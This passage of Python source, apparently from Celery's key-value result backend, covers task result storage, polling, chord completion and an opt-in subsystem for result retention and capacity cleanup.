            self.task_keyprefix = f"{global_keyprefix}{self.task_keyprefix}"
            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"
            self.chord_keyprefix = f"{global_keyprefix}{self.chord_keyprefix}"

    def _encode_prefixes(self):
        self.task_keyprefix = self.key_t(self.task_keyprefix)
        self.group_keyprefix = self.key_t(self.group_keyprefix)
        self.chord_keyprefix = self.key_t(self.chord_keyprefix)

    def get(self, key):
        raise NotImplementedError('Must implement the get method.')

    def mget(self, keys):
        raise NotImplementedError('Does not support get_many')

    def _set_with_state(self, key, value, state):
        return self.set(key, value)

    def set(self, key, value):
        raise NotImplementedError('Must implement the set method.')

    def delete(self, key):
        raise NotImplementedError('Must implement the delete method')

    def incr(self, key):
        raise NotImplementedError('Does not implement incr')

    def expire(self, key, value):
        pass

    def get_key_for_task(self, task_id, key=''):
        """Get the cache key for a task by id."""
        if not task_id:
            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')
        return self._get_key_for(self.task_keyprefix, task_id, key)

    def get_key_for_group(self, group_id, key=''):
        """Get the cache key for a group by id."""
        if not group_id:
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.group_keyprefix, group_id, key)

    def get_key_for_chord(self, group_id, key=''):
        """Get the cache key for the chord waiting on group with given id."""
        if not group_id:
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.chord_keyprefix, group_id, key)

    def _get_key_for(self, prefix, id, key=''):
        key_t = self.key_t
        if isinstance(id, UUID):
            id = str(id)

        return key_t('').join([
            prefix, key_t(id), key_t(key),
        ])

    def _strip_prefix(self, key):
        """Take bytes: emit string."""
        key = self.key_t(key)
        for prefix in self.task_keyprefix, self.group_keyprefix:
            if key.startswith(prefix):
                return bytes_to_str(key[len(prefix):])
        return bytes_to_str(key)

    def _filter_ready(self, values, READY_STATES=states.READY_STATES):
        for k, value in values:
            if value is not None:
                value = self.decode_result(value)
                if value['status'] in READY_STATES:
                    yield k, value

    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):
        if hasattr(values, 'items'):
            # client returns dict so mapping preserved.
            return {
                self._strip_prefix(k): v
                for k, v in self._filter_ready(values.items(), READY_STATES)
            }
        else:
            # client returns list so need to recreate mapping.
            return {
                bytes_to_str(keys[i]): v
                for i, v in self._filter_ready(enumerate(values), READY_STATES)
            }

    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,
                 on_message=None, on_interval=None, max_iterations=None,
                 READY_STATES=states.READY_STATES):
        interval = 0.5 if interval is None else interval
        ids = task_ids if isinstance(task_ids, set) else set(task_ids)
        cached_ids = set()
        cache = self._cache
        for task_id in ids:
            try:
                cached = cache[task_id]
            except KeyError:
                pass
            else:
                if cached['status'] in READY_STATES:
                    yield bytes_to_str(task_id), cached
                    cached_ids.add(task_id)

        ids.difference_update(cached_ids)
        iterations = 0
        time_elapsed = 0.0
        while ids:
            keys = list(ids)
            r = self._mget_to_results(self.mget([self.get_key_for_task(k)
                                                 for k in keys]), keys, READY_STATES)
            cache.update(r)
            ids.difference_update({bytes_to_str(v) for v in r})
            for key, value in r.items():
                if on_message is not None:
                    on_message(value)
                yield bytes_to_str(key), value
            if not ids:
                # everything asked for has been handed back, so there is
                # nothing left to time out on. wait_for checks the same way,
                # returning a ready result before it looks at the deadline.
                break
            if timeout is not None and time_elapsed >= timeout:
                raise TimeoutError(f'Operation timed out ({timeout})')
            if on_interval:
                on_interval()
            # don't busy loop, and never sleep past the deadline: with the
            # deadline counted in whole intervals, timeout=0 waited forever
            # and any timeout below interval overshot to interval.
            nap = interval if timeout is None else min(interval,
                                                       timeout - time_elapsed)
            time.sleep(nap)
            time_elapsed += nap
            iterations += 1
            if max_iterations and iterations >= max_iterations:
                break

    def _forget(self, task_id):
        self.delete(self.get_key_for_task(task_id))

    def _store_result(self, task_id, result, state,
                      traceback=None, request=None, **kwargs):
        meta = self._get_result_meta(result=result, state=state,
                                     traceback=traceback, request=request)
        meta['task_id'] = bytes_to_str(task_id)

        # Storage-side capacity governance is opt-in; when it is disabled the
        # write path is byte-for-byte the legacy one below.
        if self.governance_enabled:
            return self._store_result_governed(task_id, state, meta)

        # Retrieve metadata from the backend, if the status
        # is a success then we ignore any following update to the state.
        # This solves a task deduplication issue because of network
        # partitioning or lost workers. This issue involved a race condition
        # making a lost task overwrite the last successful result in the
        # result backend.
        current_meta = self._get_task_meta_for(task_id)

        if current_meta['status'] == states.SUCCESS:
            return result

        try:
            self._set_with_state(self.get_key_for_task(task_id), self.encode(meta), state)
        except BackendStoreError as ex:
            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex

        return result

    def _store_result_governed(self, task_id, state, meta):
        """Write path used when storage-side capacity governance is enabled."""
        key = self.get_key_for_task(task_id)
        current_raw = self.get(key)
        is_new = not current_raw
        if current_raw:
            # Keep the same SUCCESS-is-terminal guarantee as the legacy path,
            # reading the value straight from the store (no cache markers).
            try:
                if self.decode_result(current_raw)['status'] == states.SUCCESS:
                    return meta['result']
            except Exception:  # pylint: disable=broad-except
                # An unreadable value is treated as absent so it can be healed.
                is_new = True
                current_raw = None
        elif not self._governance_allows_new_result(state):
            # A capacity ceiling of 0 stops new results from being written;
            # readers then observe the task as still PENDING.
            logger.info(
                'Result capacity ceiling is 0, dropping new result for '
                'task %r (state %r)', task_id, state,
            )
            return meta['result']

        payload = self.encode(meta)
        new_size = self._payload_size(payload)
        old_size = self._payload_size(current_raw) if current_raw else 0
        try:
            self._set_with_state(key, payload, state)
        except BackendStoreError as ex:
            raise BackendStoreError(str(ex), state=state, task_id=task_id) from ex

        self._governance_note_write(
            is_new=is_new, delta_bytes=new_size - old_size)
        self._maybe_enforce_capacity_after_write()
        return meta['result']

    def _save_group(self, group_id, result):
        self._set_with_state(self.get_key_for_group(group_id),
                             self.encode({'result': result.as_tuple()}), states.SUCCESS)
        return result

    def _delete_group(self, group_id):
        # Removing the group metadata is what turns an unfinished group into
        # a finished one; serialize it with governance cleanup so a cleanup
        # can never observe a half-finished chord completion.
        if self.governance_enabled:
            with self._governance_storage_lock():
                self.delete(self.get_key_for_group(group_id))
        else:
            self.delete(self.get_key_for_group(group_id))

    def _get_task_meta_for(self, task_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_task(task_id))
        if not meta:
            return {'status': states.PENDING, 'result': None}
        return self.decode_result(meta)

    def task_result_exists(self, task_id):
        """Check if a result exists in the backend for the given task ID.

        This overrides the base implementation to directly check for
        the existence of the key in the store, which is more accurate
        than checking the status since tasks stored with PENDING status
        would still be detected.

        .. versionadded:: 5.7.0

        Returns:
            bool: :const:`True` if the backend has a result for the task,
                :const:`False` otherwise.
        """
        return bool(self.get(self.get_key_for_task(task_id)))

    def _restore_group(self, group_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_group(group_id))
        # previously this was always pickled, but later this
        # was extended to support other serializers, so the
        # structure is kind of weird.
        if meta:
            meta = self.decode(meta)
            result = meta['result']
            meta['result'] = result_from_tuple(result, self.app)
            return meta

    # ------------------------------------------------------------------
    # Storage-side capacity governance
    # ------------------------------------------------------------------
    #
    # Everything in this block is opt-in via
    # ``result_governance_enabled``.  It works purely from data that
    # exists in the store itself: task meta keys are enumerated by the
    # backend, and a result is considered protected by an unfinished
    # group only while that group's metadata key is present in the
    # store.  No in-memory markers or caller identifiers are involved.

    def _init_governance(self):
        """Read and validate the governance configuration at startup."""
        conf = self.app.conf
        self.governance_enabled = bool(
            conf.get('result_governance_enabled', False))
        self._governance_thread_lock = threading.RLock()
        # Estimate of store occupancy since the last full scan; the next
        # scan corrects drift caused by other processes and storage native
        # key expiry.  Keeping this estimate makes the common (below cap)
        # write path touch only local state.
        self._governance_observed = None
        self._governance_pending = 0
        self._governance_pending_bytes = 0
        self.governance_retention = {}
        self.governance_max_results = None
        self.governance_max_bytes = None
        if not self.governance_enabled:
            return
        if not self.supports_capacity_governance:
            raise ImproperlyConfigured(E_GOVERNANCE_UNSUPPORTED.format(
                backend=type(self).__name__))
        self.governance_retention = prepare_retention_policy(
            conf.get('result_governance_retention'))
        self.governance_max_results = prepare_capacity_limit(
            conf.get('result_governance_max_results'),
            'result_governance_max_results')
        self.governance_max_bytes = prepare_capacity_limit(
            conf.get('result_governance_max_bytes'),
            'result_governance_max_bytes')
        self._validate_governance_backend()

    def _validate_governance_backend(self):
        """Hook for backends unable to govern every transport they wrap."""

    def _governance_option(self, name, default):
        options = self.app.conf.get('result_backend_transport_options') or {}
        return options.get(name, default)

    def _governance_allows_new_result(self, state):
        # A ceiling of 0 on either dimension stops every new result key.
        return (self.governance_max_results != 0
                and self.governance_max_bytes != 0)

    def _governance_note_write(self, is_new, delta_bytes):
        if is_new:
            self._governance_pending += 1
        self._governance_pending_bytes += delta_bytes

    def _maybe_enforce_capacity_after_write(self):
        # A ceiling of 0 is the "stop writing new results" switch; it does
        # not retroactively empty the store on the write path.
        positive_results = (self.governance_max_results is not None
                            and self.governance_max_results > 0)
        positive_bytes = (self.governance_max_bytes is not None
                          and self.governance_max_bytes > 0)
        if not positive_results and not positive_bytes:
            return
        interval = max(1, int(self._governance_option(
            'governance_scan_interval', 100)))
        if self._governance_observed is not None:
            observed_count, observed_bytes = self._governance_observed
            estimated_count = observed_count + self._governance_pending
            estimated_bytes = observed_bytes + self._governance_pending_bytes
            within = True
            if positive_results \
                    and estimated_count > self.governance_max_results:
                within = False
            if positive_bytes \
                    and estimated_bytes > self.governance_max_bytes:
                within = False
            # Still resync periodically so other writers and storage
            # native expirations get accounted for.
            if within and self._governance_pending < interval:
                return
        self.enforce_result_capacity()

    @contextmanager
    def _governance_storage_lock(self):
        """Serialize governance runs.

        The base implementation only serializes threads within a process;
        backends with a shared store override this with a lock that lives
        in the store itself, so a cleanup on one worker cannot interleave
        with a chord completion or cleanup on another worker.
        """
        self._governance_thread_lock.acquire()
        try:
            yield
        finally:
            self._governance_thread_lock.release()

    # -- backend supplied storage primitives ---------------------------

    def _iter_result_keys(self):
        """Yield every task result key currently present in the store."""
        raise NotImplementedError(
            'Backend does not implement result key enumeration, required by '
            'storage-side capacity governance.')

    def _payload_size(self, raw):
        if raw is None:
            return 0
        if isinstance(raw, (bytes, bytearray, memoryview)):
            return len(raw)
        return len(ensure_bytes(raw))

    def _iter_result_payloads(self):
        """Yield :class:`ScannedValue` for every stored task result.

        The default implementation issues one GET per key; backends with
        batching (Redis MGET) or stat() information (file system) override
        this.
        """
        for key in self._iter_result_keys():
            raw = self.get(key)
            if raw is None:
                # Expired between enumeration and read.
                continue
            yield ScannedValue(key, raw, self._payload_size(raw), None)

    def _delete_result_keys(self, keys):
        """Delete result keys, ignoring keys that vanished meanwhile.

        This is what makes repeatedly triggered eviction idempotent: a key
        that another run already removed is simply not there anymore.
        """
        for key in keys:
            try:
                self.delete(key)
            except FileNotFoundError:
                pass
        return len(keys)

    # -- scanning --------------------------------------------------------

    def _snapshot_results(self):
        records = []
        for scanned in self._iter_result_payloads():
            raw = scanned.raw
            try:
                meta = self.decode_result(raw)
            except Exception:  # pylint: disable=broad-except
                # Never let a foreign/corrupt value break a cleanup run;
                # such keys are left strictly untouched.
                logger.warning(
                    'Skipping unreadable result key %r during governance '
                    'scan', scanned.key, exc_info=True)
                continue
            date_done = parse_date_done(
                meta.get('date_done'), self.app.timezone)
            written_at = scanned.written_at
            if written_at is None:
                written_at = date_done.timestamp() if date_done else None
            records.append(StoredResult(
                key=scanned.key,
                task_id=meta.get('task_id') or self._strip_prefix(scanned.key),
                status=meta.get('status'),
                date_done=date_done,
                written_at=written_at,
                size=(scanned.size if scanned.size is not None
                      else self._payload_size(raw)),
                group_id=meta.get('group_id'),
                raw=raw,
            ))
        return records

    def _group_alive(self, group_id, group_cache):
        """Return True iff group metadata for ``group_id`` is in the store.

        The only signal consulted is the group metadata key as it exists
        in the store right now - never an in-memory marker and never a
        caller supplied identifier.
        """
        if not group_id:
            return False
        if group_id not in group_cache:
            group_cache[group_id] = bool(
                self.get(self.get_key_for_group(group_id)))
        return group_cache[group_id]

    def _result_protection(self, record, group_cache):
        if record.status not in states.READY_STATES:
            # The task itself has not finished yet.
            return True, 'unfinished'
        if self._group_alive(record.group_id, group_cache):
            # Group metadata still present -> group/chord in flight.
            return True, 'group'
        return False, None

    # -- filtering and planning -----------------------------------------

    def _make_filters(self, states_filter, task_ids, since, until):
        since_dt = coerce_time_window(since, 'since', self.app.timezone)
        until_dt = coerce_time_window(until, 'until', self.app.timezone)
        if since_dt is not None and until_dt is not None \
                and since_dt > until_dt:
            raise ValueError('`since` is later than `until`')
        return CleanupFilters(
            states=normalize_value_set(states_filter, 'states'),
            task_ids=normalize_value_set(task_ids, 'task_ids'),
            since=since_dt,
            until=until_dt,
        )

    def _record_matches_filters(self, record, filters):
        if filters is None:
            return True
        if filters.states is not None and record.status not in filters.states:
            return False
        if filters.task_ids is not None \
                and record.task_id not in filters.task_ids:
            return False
        if filters.since is not None and (
                record.written_at is None
                or record.written_at < filters.since.timestamp()):
            return False
        if filters.until is not None and (
                record.written_at is None
                or record.written_at > filters.until.timestamp()):
            return False
        return True

    def _plan_cleanup(self, records, now, enforce_retention,
                      enforce_capacity, filters):
        """Decide which records retention/capacity eviction would remove."""
        group_cache = {}
        retention_picks = {}
        capacity_pool = []
        protected_count = 0
        total_count = len(records)
        total_bytes = 0
        for record in records:
            total_bytes += record.size
            protected, _reason = self._result_protection(
                record, group_cache)
            if protected:
                protected_count += 1
                continue
            if not self._record_matches_filters(record, filters):
                continue
            if (enforce_retention
                    and record.status in self.governance_retention
                    and record.written_at is not None
                    and now - record.written_at
                    >= self.governance_retention[record.status]):
                retention_picks[record.key] = record
            if (enforce_capacity
                    and record.status in states.READY_STATES
                    and record.written_at is not None):
                capacity_pool.append(record)

        to_delete = dict(retention_picks)
        projected_count = total_count - len(to_delete)
        projected_bytes = (
            total_bytes - sum(r.size for r in to_delete.values()))
        capacity_picks = {}
        if enforce_capacity and (self.governance_max_results is not None
                                 or self.governance_max_bytes is not None):
            # Oldest write time first; the key is a deterministic tie
            # breaker so repeated runs make identical choices.
            ordered = sorted(
                capacity_pool,
                key=lambda r: (r.written_at, bytes_to_str(r.key)))
            for record in ordered:
                count_over = (
                    self.governance_max_results is not None
                    and projected_count > self.governance_max_results)
                bytes_over = (
                    self.governance_max_bytes is not None
                    and projected_bytes > self.governance_max_bytes)
                if not count_over and not bytes_over:
                    break
                if record.key not in to_delete:
                    # Dedup against a key the retention tier already
                    # selected - one key is deleted at most once.
                    capacity_picks[record.key] = record
                    to_delete[record.key] = record
                    projected_count -= 1
                    projected_bytes -= record.size
        return {
            'retention': retention_picks,
            'capacity': capacity_picks,
            'delete': to_delete,
            'protected_count': protected_count,
            'total_count': total_count,
            'total_bytes': total_bytes,
        }

    def _execute_cleanup_plan(self, plan):
        """Delete planned keys after re-verifying them under the lock.

        Re-verification compares the value against what the scan saw and
        re-checks group liveness, so a concurrent store_result or chord
        completion cannot have its fresh value removed by a stale plan.
        Returns ``(deleted_keys, freed_bytes)``.
        """
        group_cache = {}
        keys = []
        freed_bytes = 0
        for record in plan['delete'].values():
            raw = self.get(record.key)
            if raw is None or raw != record.raw:
                continue
            try:
                meta = self.decode_result(raw)
            except Exception:  # pylint: disable=broad-except
                continue
            if meta.get('status') != record.status:
                continue
            group_id = meta.get('group_id')
            if self._group_alive(group_id, group_cache):
                continue
            keys.append(record.key)
            freed_bytes += record.size
        self._delete_result_keys(keys)
        for record in plan['delete'].values():
            if record.key in keys:
                # Drop stale values from the local read cache; otherwise a
                # later get_task_meta() could observe an evicted SUCCESS.
                self._cache.pop(record.task_id, None)
        return keys, freed_bytes

    @staticmethod
    def _pagination_window(limit, offset):
        offset = int(offset or 0)
        if offset < 0:
            raise ValueError('`offset` must be >= 0')
        if limit is None:
            return offset, None
        limit = int(limit)
        if limit < 0:
            raise ValueError('`limit` must be >= 0')
        return offset, offset + limit

    # -- public API ------------------------------------------------------

    def inspect_results(self, states=None, task_ids=None, since=None,
                        until=None, tier=None, protected=None,
                        limit=None, offset=0):
        """List stored results without modifying the store.

        Filters by final-state retention tier, state, write-time window and
        task id.  Returns a :class:`ResultInventory` with per-state counts
        and byte usage in addition to the (optionally paginated) items.
        Only read operations are issued - no SET/DELETE/EXPIRE, no lock
        keys, and the local result cache is neither read nor written.
        """
        if not self.governance_enabled:
            raise ImproperlyConfigured(E_GOVERNANCE_DISABLED.strip())
        filters = self._make_filters(states, task_ids, since, until)
        tier_states = normalize_value_set(tier, 'tier')
        if tier_states:
            unknown = tier_states - set(self.governance_retention)
            if unknown:
                raise ValueError(
                    'No retention tier configured for states: '
                    + ', '.join(sorted(unknown)))
            states_filter = tier_states if filters.states is None \
                else filters.states & tier_states
            filters = filters._replace(states=states_filter)

        # Deliberately no storage lock here: this is a read-only inventory,
        # and taking the storage lock would itself write a lock key. Keys
        # that vanish mid-scan are skipped by the enumerator.
        records = self._snapshot_results()
        group_cache = {}
        matching = []
        for record in records:
            if not self._record_matches_filters(record, filters):
                continue
            is_protected, reason = self._result_protection(
                record, group_cache)
            if protected is not None \
                    and bool(is_protected) != bool(protected):
                continue
            matching.append((record, is_protected, reason))

        by_state = {}
        total_bytes = 0
        for record, _is_protected, _reason in matching:
            usage = by_state.get(record.status)
            if usage is None:
                by_state[record.status] = StateUsage(1, record.size)
            else:
                by_state[record.status] = StateUsage(
                    usage.count + 1, usage.bytes + record.size)
            total_bytes += record.size

        # Oldest first; records without a known write time sort last.
        matching.sort(key=lambda entry: (
            entry[0].written_at is None,
            entry[0].written_at if entry[0].written_at is not None else 0.0,
            bytes_to_str(entry[0].key)))
        window_start, window_end = self._pagination_window(limit, offset)
        items = []
        for record, is_protected, reason in matching[window_start:window_end]:
            retention = self.governance_retention.get(record.status)
            expires_at = None
            if retention is not None and record.written_at is not None:
                expires_at = datetime.fromtimestamp(
                    record.written_at + retention, tz=self.app.timezone)
            items.append(ResultInventoryItem(
                task_id=record.task_id,
                status=record.status,
                date_done=record.date_done,
                size_bytes=record.size,
                group_id=record.group_id,
                retention_seconds=retention,
                expires_at=expires_at,
                protected=is_protected,
                protection_reason=reason,
            ))
        return ResultInventory(
            items=items,
            total_count=len(matching),
            total_bytes=total_bytes,
            by_state=by_state,
        )

    def cleanup_results(self, enforce_retention=True,
                        enforce_capacity=True, states=None, task_ids=None,
                        since=None, until=None, dry_run=False):
        """Manually remove expired/over-capacity results.

        Applies the per-state retention tiers and/or the count/byte
        ceilings, optionally restricted by the same filters as
        :meth:`inspect_results`.  With ``dry_run`` nothing is deleted;
        the returned :class:`CleanupReport` describes what would happen.
        """
        if not self.governance_enabled:
            raise ImproperlyConfigured(E_GOVERNANCE_DISABLED.strip())
        filters = self._make_filters(states, task_ids, since, until)
        now = self.app.now().timestamp()
        with self._governance_storage_lock():
            records = self._snapshot_results()
            plan = self._plan_cleanup(
                records, now,
                enforce_retention=enforce_retention,
                enforce_capacity=enforce_capacity,
                filters=filters)
            if dry_run:
                deleted_keys = []
                freed_bytes = 0
            else:
                deleted_keys, freed_bytes = self._execute_cleanup_plan(plan)
            # Refresh the write-path estimate from actual occupancy.
            self._governance_observed = (
                plan['total_count'] - len(deleted_keys),
                plan['total_bytes'] - freed_bytes)
            self._governance_pending = 0
            self._governance_pending_bytes = 0

            retention_deleted = sum(
                1 for key in deleted_keys if key in plan['retention'])
            capacity_deleted = sum(
                1 for key in deleted_keys if key in plan['capacity'])
            if dry_run:
                report_keys = [
                    record.task_id
                    for record in plan['delete'].values()]
            else:
                report_keys = [
                    plan['delete'][key].task_id for key in deleted_keys]
            return CleanupReport(
                deleted_count=len(deleted_keys),
                freed_bytes=freed_bytes,
                keys=report_keys,
                retention_deleted=retention_deleted,
                capacity_deleted=capacity_deleted,
                protected_count=plan['protected_count'],
                inspected_count=plan['total_count'],
                inspected_bytes=plan['total_bytes'],
            )

    def enforce_result_capacity(self):
        """Run only the count/byte ceiling enforcement."""
        return self.cleanup_results(
            enforce_retention=False, enforce_capacity=True)

    def enforce_result_retention(self):
        """Run only the per-state retention tier cleanup."""
        return self.cleanup_results(
            enforce_retention=True, enforce_capacity=False)

    def cleanup(self):
        """Periodic backend cleanup hook (``celery.backend_cleanup``)."""
        if self.governance_enabled:
            return self.cleanup_results()

    def _apply_chord_incr(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        header_result.save(backend=self)

    def on_chord_part_return(self, request, state, result, **kwargs):
        if not self.implements_incr:
            return
        app = self.app
        gid = request.group
        if not gid:
            return
        key = self.get_key_for_chord(gid)
        try:
            deps = GroupResult.restore(gid, backend=self)
        except Exception as exc:  # pylint: disable=broad-except
            callback = maybe_signature(request.chord, app=app)
            logger.exception('Chord %r raised: %r', gid, exc)
            return self.chord_error_from_stack(
                callback,
                ChordError(f'Cannot restore group: {exc!r}'),
            )
        if deps is None:
            try:
                raise ValueError(gid)
            except ValueError as exc:
                callback = maybe_signature(request.chord, app=app)
                logger.exception('Chord callback %r raised: %r', gid, exc)
                return self.chord_error_from_stack(
                    callback,
                    ChordError(f'GroupResult {gid} no longer exists'),
                )
        val = self.incr(key)
        # Set the chord size to the value defined in the request, or fall back
        # to the number of dependencies we can see from the restored result
        size = request.chord.get("chord_size")
        if size is None:
            size = len(deps)
        if val > size:  # pragma: no cover
            logger.warning('Chord counter incremented too many times for %r',
                           gid)
        elif val == size:
            callback = maybe_signature(request.chord, app=app)
            j = deps.join_native if deps.supports_native_join else deps.join
            try:
                with allow_join_result():
                    ret = j(
                        timeout=app.conf.result_chord_join_timeout,
                        propagate=True)
            except Exception as exc:  # pylint: disable=broad-except
                try:
                    culprit = next(deps._failed_join_report())
                    reason = 'Dependency {0.id} raised {1!r}'.format(
                        culprit, exc,
                    )
                except StopIteration:
                    reason = repr(exc)
                logger.exception('Chord %r raised: %r', gid, reason)
                chord_error = _create_chord_error_with_cause(message=reason, original_exc=exc)
                self.chord_error_from_stack(callback=callback, exc=chord_error)
            else:
                try:
                    callback.delay(ret)
                except Exception as exc:  # pylint: disable=broad-except
                    logger.exception('Chord %r raised: %r', gid, exc)
                    chord_error = _create_chord_error_with_cause(
                        message=f'Callback error: {exc!r}', original_exc=exc
                    )
                    self.chord_error_from_stack(callback=callback, exc=chord_error)
            finally:
                deps.delete()
                self.delete(key)
        else:
            self.expire(key, self.expires)


class KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):
    """Result backend base class for key/value stores."""


class DisabledBackend(BaseBackend):
    """Dummy result backend."""

    _cache = {}  # need this attribute to reset cache in tests.

    def store_result(self, *args, **kwargs):
        pass

    def ensure_chords_allowed(self):
        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())

    def _is_disabled(self, *args, **kwargs):
        raise NotImplementedError(E_NO_BACKEND.strip())

    def as_uri(self, *args, **kwargs):
        return 'disabled://'

    get_state = get_status = get_result = get_traceback = _is_disabled
    get_task_meta_for = wait_for = get_many = _is_disabled
